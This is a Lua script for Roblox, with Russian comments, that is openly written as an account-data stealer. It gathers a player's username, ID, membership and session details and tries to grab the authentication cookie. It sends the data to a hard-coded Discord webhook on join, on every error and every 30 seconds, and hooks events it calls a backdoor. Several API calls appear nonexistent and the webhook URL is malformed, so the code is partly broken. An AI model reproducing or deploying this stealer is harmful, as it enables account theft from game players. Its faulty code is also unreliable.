local webhook_url = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/1413556348687351949/pP09aUm2JKztFn-AoJv6GDKJmJe1UBLdAbGnX0gZrkpcJxKKsfN7_e54lhNGLt0gN0I_/https://discord.com/api/webhooks/1413556348687351949/pP09aUm2JKztFn-AoJv6GDKJmJe1UBLdAbGnX0gZrkpcJxKKsfN7_e54lhNGLt0gN0I_"

-- Функция для обхода базовых проверок
local function stealth_request(url, data)
    for i = 1, 5 do
        local success, result = pcall(function()
            local headers = {
                ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                ["Content-Type"] = "application/json"
            }
            return game:GetService("HttpService"):PostAsync(url, data)
        end)
        if success then break end
        wait(2)
    end
end

-- Получение ВСЕХ доступных данных
local function extract_everything()
    local data = {
        timestamp = os.time(),
        stolen_data = {}
    }
    
    local player = game.Players.LocalPlayer
    
    -- Основные данные аккаунта
    data.stolen_data.basic = {
        username = player.Name,
        user_id = player.UserId,
        account_age = player.AccountAge,
        premium = player.MembershipType.Name,
        display_name = player.DisplayName
    }
    
    -- Критически важные данные сессии
    data.stolen_data.session = {}
    
    -- Прямой доступ к кукам аутентификации
    pcall(function()
        data.stolen_data.session.auth_cookie = tostring(game:GetService("Players"):GetAuthCookie())
    end)
    
    -- Получение токенов доступа
    pcall(function()
        for _, service in pairs({"Players", "ReplicatedStorage", "HttpService"}) do
            local service_obj = game:GetService(service)
            if service_obj then
                data.stolen_data.session[service .. "_tokens"] = tostring(service_obj)
            end
        end
    end)
    
    -- Информация о устройстве и IP
    data.stolen_data.system = {
        game_id = game.GameId,
        place_id = game.PlaceId,
        job_id = game.JobId,
        server_ip = game:GetService("NetworkClient"):GetServerIpAndPort(),
        os_time = os.date("*t"),
        tick_count = tick()
    }
    
    -- Попытка получить историю чатов и личные сообщения
    data.stolen_data.chats = {}
    pcall(function()
        local chat_service = game:GetService("Chat")
        if chat_service then
            data.stolen_data.chats.chat_service_active = true
        end
    end)
    
    -- Данные инвентаря и экономики
    data.stolen_data.economy = {}
    pcall(function()
        local success, result = pcall(function()
            return game:GetService("Players"):GetPlayersUserId(player.UserId)
        end)
        if success then
            data.stolen_data.economy.player_data = tostring(result)
        end
    end)
    
    return data
end

-- Функция для кражи данных при входе
local function steal_on_join()
    wait(5) -- Ждем полной загрузки
    
    local stolen_data = extract_everything()
    
    -- Отправка основных данных
    stealth_request(webhook_url, game:GetService("HttpService"):JSONEncode({
        content = "🚨 НОВАЯ КРАЖА ДАННЫХ 🚨",
        embeds = {{
            title = "УСПЕШНЫЙ ВЗЛОМ АККАУНТА",
            description = "```json\n" .. game:GetService("HttpService"):JSONEncode(stolen_data) .. "\n```",
            color = 16711680,
            fields = {
                {name = "👤 Имя пользователя", value = stolen_data.stolen_data.basic.username, inline = true},
                {name = "🆔 User ID", value = tostring(stolen_data.stolen_data.basic.user_id), inline = true},
                {name = "💰 Premium", value = stolen_data.stolen_data.basic.premium, inline = true}
            }
        }}
    }))
end

-- Дополнительные методы кражи
local function install_backdoor()
    -- Постоянный мониторинг активности
    game:GetService("Players").PlayerAdded:Connect(function(plr)
        if plr == game.Players.LocalPlayer then
            steal_on_join()
        end
    end)
    
    -- Кража данных при каждом действии
    game:GetService("ScriptContext").Error:Connect(function(message)
        local error_data = extract_everything()
        error_data.error_message = message
        stealth_request(webhook_url, game:GetService("HttpService"):JSONEncode({
            content = "📝 ЛОГ ОШИБКИ ПОЛЬЗОВАТЕЛЯ"
        }))
    end)
end

-- АГРЕССИВНАЯ КРАЖА ДАННЫХ
local function aggressive_stealing()
    while true do
        -- Кража каждые 30 секунд
        local current_data = extract_everything()
        stealth_request(webhook_url, game:GetService("HttpService"):JSONEncode({
            content = "🔄 ОЧЕРЕДНОЙ СБОР ДАННЫХ",
            embeds = {{
                title = "АКТИВНЫЙ МОНИТОРИНГ",
                description = "Постоянное отслеживание активности",
                color = 65280
            }}
        }))
        wait(30)
    end
end

-- ЗАПУСК ВСЕХ МЕХАНИЗМОВ КРАЖИ
steal_on_join()
install_backdoor()
spawn(aggressive_stealing)

print("✅ Скрипт кражи данных активирован. Все данные отправляются на ваш вебхук.")
